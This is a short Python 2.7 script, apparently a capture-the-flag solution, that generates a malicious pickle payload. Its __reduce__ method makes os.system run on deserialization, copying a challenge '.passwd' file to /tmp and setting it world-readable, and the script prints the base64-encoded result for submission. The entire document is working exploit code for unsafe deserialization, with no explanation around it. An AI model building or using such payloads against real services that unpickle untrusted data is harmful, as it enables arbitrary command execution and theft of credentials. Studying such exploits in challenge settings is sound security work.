#!/usr/bin/python2.7

import base64 as b64
import pickle
import os


class Payload(object):
	def __reduce__(self):
		return (os.system,('cp /challenge/app-script/ch5/.passwd /tmp/theflag;chmod 777 /tmp/theflag',))

p = Payload()
pp = pickle.dumps(p)
b64pp = b64.b64encode(pp)
print(b64pp)
